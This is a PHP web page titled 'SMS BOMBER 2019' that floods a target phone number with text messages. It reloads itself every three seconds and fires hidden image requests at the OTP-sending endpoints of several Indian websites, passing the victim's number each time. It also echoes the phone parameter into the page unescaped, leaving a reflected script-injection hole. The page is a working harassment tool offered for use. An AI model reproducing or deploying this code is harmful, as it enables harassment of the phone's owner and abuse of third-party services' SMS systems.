<?php 
error_reporting(0);
$tel_no=$_GET['phone'];
$c=$_GET['c']?$_GET['c']:0; //
$c++;
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>SMS BOMBER 2019</title>
	<?php
 if($tel_no){
    echo "<meta http-equiv=refresh content='3; url=index.php?phone={$tel_no}&amp;c={$c}'>";
 }
?>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->
	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	<div class="container-contact100">

		<div class="wrap-contact100">
		<!--<div id="vansh" style="text-align: right"><img src="img.jpg" width="300" /></div>-->
			<form class="contact100-form validate-form" action="index.php" method="GET">
				<span class="contact100-form-title">
					SMS BOMBER 2019 - START BOMBING
				</span>
			<?php if($tel_no)
					{ ?>
				<span class="contact100-form-title">
					 SMS SENT On <?php echo $tel_no; ?> : is <?php echo $c ?>
				</span>
			<?php }?>
				<div class="wrap-input100 validate-input" data-validate = "Please enter your phone">
					<input class="input100" type="text" name="phone" placeholder="Phone">
					<span class="focus-input100"></span>
				</div>
				<div class="container-contact100-form-btn">
					<button class="contact100-form-btn">
						<span>
							<i class="fa fa-paper-plane-o m-r-6" aria-hidden="true"></i>
							Send
						</span>
					</button>

				</div>
				<span class="contact100-form-title">
					<br>
					<br>
					Written By <a href="https://www.facebook.com/vanshdevgan0221"><span id="a" ><i>Vansh Devgan</i></span></a>
				</span>
			</form>

		</div>
	</div>

	<div id="dropDownSelect1"></div>

<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>
<?php
 if($tel_no){
?>
<!--API FOR SMS-->
<div style='display:none'>

<img src='https://m.redbus.in/api/sendOtp?number=<?php echo $tel_no;?>&cc=91' alt=''/>
<img src= 'https://www.nearbuy.com/api/user/otp/send/<?php echo $tel_no;?>?sendOnlyIfCustomerExists=false&mode=sms' alt=''/>
<img src= 'https://mapi.indiamart.com/wservce/users/OTPverification/?token=imobile%4015061981&mobile_num=<?php echo $tel_no;?>&modid=DIR&user_mobile_country_code=91&flag=OTPGen&user_ip=21.91.21.102&user_country=IN&process=OTP_JoinFreeForm_Desktop&user_updatedusing=Join+Free+Form+Desktop' alt=''/>
<img src= 'http://www.moneycontrol.com/markets_on_mobile/index.php?mobile=<?php echo $tel_no;?>&id=1' alt=''/>
<img src='https://www.loot4hub.in/SCRIPT/public_html/call.php?number=<?php echo $tel_no;?>'/>
</body>
</html>
<!--API CLOSE FOR SMS-->
<?php
	}
?>